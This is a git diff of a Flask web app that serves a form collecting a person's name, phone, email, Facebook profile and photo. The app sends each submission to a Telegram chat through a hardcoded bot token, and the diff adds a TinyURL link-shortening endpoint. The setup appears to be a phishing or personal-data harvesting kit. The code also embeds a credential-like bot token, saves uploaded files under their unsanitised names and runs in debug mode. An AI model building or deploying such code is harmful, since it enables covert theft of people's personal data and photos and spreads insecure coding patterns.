@@ -1,14 +1,21 @@
 import os
-from flask import Flask, render_template_string, request
+from flask import Flask, request, jsonify, redirect, render_template_string
 import requests
 
 app = Flask(__name__)
 
 # Telegram Bot Configurations
-BOT_TOKEN = "7721371260:AAGMALbPA8aAlZP9jrGxar25DM_nqbhsomI"
-CHAT_ID = "6904067155"
+TELEGRAM_BOT_TOKEN = "7721371260:AAGMALbPA8aAlZP9jrGxar25DM_nqbhsomI"
+TELEGRAM_CHAT_ID = "6904067155" # আপনার টেলিগ্রাম চ্যাট আইডি দিন
+# TinyURL API for Short Link Generation
+def generate_short_link(long_url):
+    response = requests.get(f"https://tinyurl.com/api-create.php?url={long_url}")
+    if response.status_code == 200:
+        return response.text
+    else:
+        return long_url
 
-# HTML Template with CSS and JavaScript
+# HTML Template for the Form
 html_template = """
 <!DOCTYPE html>
 <html>
@@ -46,13 +53,6 @@ html_template = """
             border: 1px solid #dddddd;
             border-radius: 5px;
         }
-        input:invalid {
-            border: 1px solid #ff4d4d;
-        }
-        input:invalid:focus {
-            outline: none;
-            box-shadow: 0 0 5px #ff4d4d;
-        }
         button {
             width: 100%;
             padding: 10px;
@@ -73,34 +73,11 @@ html_template = """
             color: #888888;
         }
     </style>
-    <script>
-        function validateForm() {
-            const form = document.forms["studentForm"];
-            const fields = ["name", "phone", "email", "facebook", "photo"];
-            let valid = true;
-
-            fields.forEach(field => {
-                const input = form[field];
-                if (!input.value) {
-                    input.style.border = "2px solid #ff4d4d";
-                    valid = false;
-                } else {
-                    input.style.border = "1px solid #dddddd";
-                }
-            });
-
-            if (!valid) {
-                alert("Please fill out all required fields.");
-            }
-
-            return valid;
-        }
-    </script>
 </head>
 <body>
     <div class="container">
         <h2>Submit Your Information</h2>
-        <form name="studentForm" action="/submit" method="post" enctype="multipart/form-data" onsubmit="return validateForm()">
+        <form action="/submit" method="post" enctype="multipart/form-data">
             <label for="name">Name:</label>
             <input type="text" id="name" name="name" required>
             
@@ -126,7 +103,7 @@ html_template = """
 </html>
 """
 
-# Success Page Template with CSS
+# Success Page Template
 success_template = """
 <!DOCTYPE html>
 <html>
@@ -166,6 +143,10 @@ success_template = """
 
 @app.route("/")
 def index():
+    return "Welcome! Use /form to view the form."
+
+@app.route("/form")
+def form():
     return render_template_string(html_template)
 
 @app.route("/submit", methods=["POST"])
@@ -176,7 +157,7 @@ def submit():
     facebook = request.form["facebook"]
     photo = request.files["photo"]
 
-    # Save photo locally
+    # Save the photo locally
     photo_path = f"static/{photo.filename}"
     photo.save(photo_path)
 
@@ -193,7 +174,7 @@ def submit():
         data={"chat_id": TELEGRAM_CHAT_ID, "text": message}
     )
 
-    # Send photo to Telegram
+    # Send the photo to Telegram
     with open(photo_path, "rb") as file:
         requests.post(
             f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
@@ -201,8 +182,16 @@ def submit():
             files={"photo": file}
         )
 
-    # Return success page
     return render_template_string(success_template)
+
+@app.route("/generate_short_link", methods=["GET"])
+def generate_link():
+    original_link = request.args.get("link")
+    if not original_link:
+        return jsonify({"error": "No link provided"}), 400
+
+    short_link = generate_short_link(original_link)
+    return jsonify({"short_link": short_link})
 
 if __name__ == "__main__":
     app.run(debug=True)
